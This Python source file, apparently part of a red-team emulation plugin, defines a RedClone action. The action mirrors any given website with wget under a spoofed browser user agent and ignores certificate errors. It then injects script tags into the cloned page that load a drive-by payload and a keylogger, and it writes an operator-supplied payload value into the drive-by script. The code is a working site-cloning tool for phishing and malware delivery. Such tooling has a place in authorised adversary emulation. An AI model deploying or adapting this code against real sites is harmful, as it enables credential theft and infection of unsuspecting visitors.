import subprocess
from urllib.parse import urlparse

from app.utility.base_world import BaseWorld


class RedClone(BaseWorld):

    async def action(self, url, props):
        if self._valid_url(url):
            self._replace_payload(props)
            location = 'plugins/access/static/malicious'
            open('%s/index.html' % location, 'w').close()
            user_agent = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.100 Safari/537.36"
            subprocess.call(["wget", "-U", user_agent, "-E", "-H", "-k", "-K", "-p", "-q", "-nH", "--cut-dirs=1", url,
                             "--directory", location, "--no-check-certificate", "-O", "index.html"], shell=False)
            if props['inject_payload']:
                self.prepend_to_file('%s/index.html' % location, '<script src="/access/malicious/drive.js"></script>')
            if props['inject_keylogger']:
                self.prepend_to_file('%s/index.html' % location, '<script src="/access/malicious/keys.js"></script>')
            self.prepend_to_file('%s/index.html' % location, '<script src="/gui/jquery/jquery.js"></script>')
            self.prepend_to_file('%s/index.html' % location, '<meta http-equiv="Expires" content="0">')
            self.prepend_to_file('%s/index.html' % location, '<meta http-equiv="Pragma" content="no-cache">')
            self.prepend_to_file('%s/index.html' % location, '<meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate">')

    """ PRIVATE """

    @staticmethod
    def _valid_url(url):
        try:
            result = urlparse(url)
            return all([result.scheme, result.netloc])
        except Exception:
            return False

    def _replace_payload(self, props):
        malicious_js = 'plugins/access/static/malicious/drive.js'
        with open(malicious_js, 'r') as fin:
            data = fin.read().splitlines(True)
        with open(malicious_js, 'w') as fout:
            fout.writelines(data[1:])
        self.prepend_to_file(malicious_js, 'let PAYLOAD = "%s";' % props['clone_payload'])
